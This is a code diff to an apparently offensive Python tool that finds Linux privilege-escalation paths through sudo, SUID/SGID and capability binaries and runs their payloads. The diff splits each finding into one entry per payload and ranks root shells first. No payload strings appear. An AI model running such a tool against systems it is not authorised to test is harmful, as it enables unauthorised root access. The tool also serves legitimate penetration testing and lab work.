@@ -3271,7 +3271,7 @@ class CustomLogger(logging.Logger):
 class CustomFormatter(logging.Formatter):
     def format(self, record):
         if record.levelno == logging.INFO:
-            record.msg = LIGHTGREY + "[*] " + RESET + str(record.msg)
+            record.msg = GREEN + "[+] " + RESET + str(record.msg)
         elif record.levelno == logging.ERROR:
             record.msg = RED + "[x] " + RESET + str(record.msg)
         elif record.levelno == logging.WARNING:
@@ -3389,7 +3389,6 @@ def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root",
         binary_path (str, optional): Path to binary.. Defaults to None.
         user (str, optional): User to exploit. Defaults to "root".
     """
-    payload = payload["code"]
 
     if exploit_type == SUDO_NO_PASSWD and user != "root":
         payload = payload.replace("sudo", "sudo -u " + user)
@@ -3477,8 +3476,24 @@ def check_sudo_binaries(sudo_l_output):
                     "Payloads": payloads,
                     "Type": "Sudo (Needs Password)"
                 }
-            priv_escs.append(priv_esc)
+            priv_escs = priv_escs + expand_payloads(priv_esc)
+            # priv_escs.append(priv_esc)
 
+    return priv_escs
+
+
+def expand_payloads(priv_esc):
+    """Given a priv esc entry, expand into multiple payloads."""
+
+    priv_escs = []
+
+    for payload in priv_esc["Payloads"]:
+        priv_esc_copy = priv_esc.copy()
+        priv_esc_copy["Payload"] = payload["code"]
+        priv_esc_copy["Payload Description"] = payload.get("description")
+        priv_esc_copy["Payload Type"] = payload_type(payload["code"])
+        del priv_esc_copy["Payloads"]
+        priv_escs.append(priv_esc_copy)
     return priv_escs
 
 
@@ -3512,7 +3527,7 @@ def check_sudo_nopasswd_binaries(sudo_l_output):
             }
             log.warning("Found exploitable %s binary: %s",
                         SUDO_NO_PASSWD, binary_path)
-            priv_escs.append(priv_esc)
+            priv_escs = priv_escs + expand_payloads(priv_esc)
 
     return priv_escs
 
@@ -3534,7 +3549,7 @@ def check_suid_bins():
     Returns:
         list: A list of potential privilege escalations.
     """
-    potential_privesc = []
+    priv_escs = []
     for binary, payloads in suid_bins.items():
         binary_path = get_binary_path(binary)
         if not binary_path:
@@ -3553,11 +3568,12 @@ def check_suid_bins():
                 "SUID": file_properties.get("Owner") if is_suid else None,
                 "SGID": file_properties.get("Group") if is_sgid else None
             }
-            potential_privesc.append(priv_esc)
+            priv_escs = priv_escs + expand_payloads(priv_esc)
+
             log.warning("Found exploitable %s binary: %s", "suid" if is_suid else "sgid",
                         binary_path)
 
-    return potential_privesc
+    return priv_escs
 
 
 def check_capability(binary_path, capability):
@@ -4017,7 +4033,8 @@ def display_privilege_escalation_options(priv_escs):
         logging.warning("No privilege escalations found.")
         sys.exit(1)
 
-    print("\nExploitable Binaries")
+    log.warning("Found %d Exploitable Binaries", len(priv_escs))
+
     for key, value in enumerate(priv_escs):
         print_formatted_priv_esc_option(key, value)
 
@@ -4025,20 +4042,35 @@ def display_privilege_escalation_options(priv_escs):
 def print_formatted_priv_esc_option(key, value):
     info = format_priv_esc_info(value)
 
-    # Initialize payload_options
-    payload_options = []
+    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'] +
+          GREEN + " " + value["Payload Type"] + RESET)
+    print("  Path: " + value["Path"])
+    print("  Info: " + info)
+    if value.get("Payload Description"):
+        print("  Payload Description: " + value["Payload Description"])
 
-    # Populate payload_options, ensuring no duplicates
-    for payload in value["Payloads"]:
-        payload_desc = payload_type(payload["code"])
-        if payload_desc not in payload_options:
-            payload_options.append(payload_desc)
 
-    payload_types = ", ".join(payload_options)
+def order_priv_escs(priv_esc):
+    """Order privilege escalations by exploitability, ease and impact."""
 
-    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'])
-    print("  Path: " + value["Path"] + "\n  Type: " +
-          value["Type"] + "\n  Info: " + info + "\n  Payloads: " + payload_types)
+    user = priv_esc.get("SudoUser") or priv_esc.get("SUID")
+    if user == "root" or priv_esc["Type"] == "Capability":
+        user_priority = 0
+    else:
+        user_priority = 1
+
+    if priv_esc["Payload Type"] == "Shell":
+        payload_priority = 0
+    elif priv_esc["Payload Type"] == "Arbitrary read":
+        payload_priority = 1
+    elif priv_esc["Payload Type"] == "Arbitrary write":
+        payload_priority = 2
+    elif priv_esc["Payload Type"] == "File Permission Change":
+        payload_priority = 3
+    else:
+        payload_priority = 4
+
+    return (user_priority, payload_priority)
 
 
 def format_priv_esc_info(priv_esc):
@@ -4072,18 +4104,12 @@ def format_priv_esc_info(priv_esc):
 
 
 def execute_payload(priv_esc, risk, command=None):
-    print("Payload Options")
-    for key, payload in enumerate(priv_esc["Payloads"]):
-        print(GREEN + "[" + str(key) + "] " +
-              RESET + priv_esc["Binary"] + GREEN + " " + payload_type(payload["code"]).lower() + RESET + " " + str(payload.get("description", "")))
-
-    choice = get_user_choice("Choose payload: ")
     user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
     if user:
-        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
+        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk,
                 binary_path=priv_esc["Path"], user=user, command=command)
     else:
-        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
+        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk,
                 binary_path=priv_esc["Path"], command=command)
 
 
@@ -4098,6 +4124,8 @@ def main():
         args)
 
     priv_escs = sudo_privescs + suid_privescs + cap_privescs
+    priv_escs = sorted(priv_escs, key=order_priv_escs)
+
     display_privilege_escalation_options(priv_escs)
 
     choice = get_user_choice("Choose method to GTFO: ")
